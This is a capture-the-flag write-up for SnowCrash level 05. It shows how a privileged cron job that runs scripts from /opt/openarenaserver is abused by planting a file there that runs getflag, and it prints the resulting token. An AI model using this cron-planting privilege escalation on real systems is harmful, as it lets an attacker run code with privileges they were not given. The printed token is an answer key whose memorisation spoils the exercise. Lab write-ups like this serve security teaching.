## Level 05

When we are logged with the level05 user we can see the following message
```bash
level05@192.168.56.101's password:
You have new mail.
```

This mean there are file in our mail folder.

```bash
level05@SnowCrash:~$ ls -l $MAIL
-rw-r--r--+ 1 root mail 58 Jul 15 22:03 /var/mail/level05
```
```bash
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

When we look at the level05 file we see a cron task executed all 2 minute. It run the openarenaserver file with the flag05 permission. After looking on internet we see that openarenaserver is a game taking configuration file

The following error message is showed when
```bash
level05@SnowCrash:~$ bash /usr/sbin/openarenaserver
bash: /opt/openarenaserver/*: No such file or directory
```

We write a file that will execute getflag and send the result in /tmp/flag
```bash
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/conf
```

After waiting 2 minute we can get the flag00
```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
